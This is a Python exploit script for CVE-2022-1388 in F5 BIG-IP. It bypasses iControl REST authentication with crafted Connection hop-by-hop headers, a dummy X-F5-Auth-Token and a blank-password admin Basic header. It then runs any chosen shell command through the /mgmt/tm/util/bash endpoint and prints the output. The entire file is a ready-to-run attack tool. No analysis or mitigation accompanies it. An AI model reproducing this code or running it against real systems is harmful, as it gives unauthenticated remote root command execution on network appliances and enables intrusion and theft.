import argparse
import requests

# Disable the 'InsecureRequestWarning' output
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def init():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", "--HOST",  help="Target IP of vulnerable BIG-IP system", required=True)
    parser.add_argument("-p", "--port", "--PORT",     help="Target port on vulnerable BIG-IP system")
    parser.add_argument("-c", "--cmd", "--command",    help="Command to run on target system")
    
    args = parser.parse_args()
    
    t = args.target
    p = args.port
    c = args.cmd
    if not p:
        # default: 443 (HTTPS)
        p = "443"
    if not c:
        c = "echo 'Successfully passed verification'"
        
    # set up the header
    header = {
            'Connection': 'keep-alive, X-F5-Auth-Token',
            'Content-Type': 'application/json',
            "Connection": "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host",
            'X-F5-Auth-Token': 'any',
            'Authorization': 'Basic YWRtaW46'
            }
    
    # set up the target url
    endpoint = "/mgmt/tm/util/bash"
    target = "https://{}:{}".format(t, p) + endpoint

    # post body with input command
    data = {
            'command': 'run', 
            'utilCmdArgs': '-c "{}"'.format(c)
            }
    return target, header, data

def CVE_2022_1388(target, header, data):
    try:
        # post the request
        res = requests.post(url=target, headers=header, json=data, proxies=None, timeout=15, verify=False)
        try: 
            res.json()['commandResult']
            # output: result part
            print(res.json()['commandResult'])
        except:
            print(res)

    except KeyError:
        print("Error:", res)

if __name__ == "__main__":
    target, header, data = init()
    CVE_2022_1388(target, header, data)